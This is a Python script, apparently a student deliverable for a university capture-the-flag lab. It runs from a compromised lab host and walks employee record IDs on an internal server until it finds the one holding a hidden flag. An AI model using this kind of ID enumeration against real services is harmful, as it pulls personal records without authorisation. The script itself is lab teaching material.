#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (C) 2026 Fernando Boiero — CyberLab UTN FRVM
# Modificado por el Grupo 06 (octubre 2026): implementación de buscar_flag()
# y del flujo de enumeración de legajos. Se distribuye bajo la misma licencia.
"""
recolector.py — entregable del Lab 08 (automatización), grupo 06.

Enumera los legajos de /empleado?id=N en el host interno, detecta el que trae la
clave `legajo_oculto` y corta apenas lo encuentra.

Se ejecuta dentro del host comprometido (make shell-victima), porque el host
interno solo se alcanza desde ahí:

    python3 recolector.py --base http://phantomcorp-db --desde 1 --hasta 250

Solo usa la biblioteca estándar (urllib).
"""
import argparse
import json
import sys
import urllib.request
import urllib.error


def consultar_legajo(base: str, id_: int, timeout: float = 3.0) -> dict | None:
    """Pide /empleado?id=<id_> y devuelve el dict de la respuesta, o None si falla.

    Los errores HTTP (por ejemplo, 404 de un legajo inexistente) y de red
    devuelven None para que el recorrido continúe.
    """
    url = f"{base}/empleado?id={id_}"
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError:
        return None          # 404 = legajo inexistente
    except Exception as e:
        print(f"[!] error en id={id_}: {e}", file=sys.stderr)
        return None


def buscar_flag(base: str, desde: int, hasta: int) -> tuple[int, str] | None:
    """Recorre los legajos [desde, hasta] y devuelve (id, flag) del que tenga el
    flag, o None si no aparece.

    Los legajos normales tienen 'nombre' y 'area'; el que esconde el flag trae
    además la clave 'legajo_oculto'.
    """
    for id_ in range(desde, hasta + 1):
        legajo = consultar_legajo(base, id_)

        if legajo is None:
            continue

        if "legajo_oculto" in legajo:
            return id_, legajo["legajo_oculto"]

    return None


def main() -> int:
    ap = argparse.ArgumentParser(description="Recolector de legajos (Lab 08).")
    ap.add_argument("--base", default="http://phantomcorp-db")
    ap.add_argument("--desde", type=int, default=1)
    ap.add_argument("--hasta", type=int, default=250)
    args = ap.parse_args()

    print(f"[*] Enumerando legajos {args.desde}..{args.hasta} en {args.base}")
    hallazgo = buscar_flag(args.base, args.desde, args.hasta)
    if hallazgo:
        id_, flag = hallazgo
        print(f"[+] Flag en el legajo id={id_}: {flag}")
        return 0
    print("[-] No se encontró el flag en el rango dado.")
    return 1


if __name__ == "__main__":
    sys.exit(main())
